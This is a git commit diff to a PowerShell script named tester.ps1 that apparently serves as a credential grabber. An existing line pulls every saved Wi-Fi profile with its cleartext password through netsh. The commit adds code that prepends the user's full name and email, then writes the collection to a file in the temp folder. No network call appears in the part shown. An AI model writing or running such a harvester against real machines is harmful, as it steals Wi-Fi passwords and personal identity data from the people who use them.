3092042b6aa6615eaacd76a2952311d0dbe1e242
nate <69339422+nanitt@users.noreply.github.com>
2023-06-12 00:13:23 -0400

    Update tester.ps1

--- tester.ps1
+++ tester.ps1
@@ -2,9 +2,17 @@
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
+$fullName = Get-fullName
+$email = Get-email
+
+$additionalText = @"
+Full Name: $fullName
+Email: $email
+"@
+
+$wifiProfiles = "$additionalText`n$wifiProfiles"
 
 $wifiProfiles > $env:TEMP/--output.txt
-
 
 ##################################
 
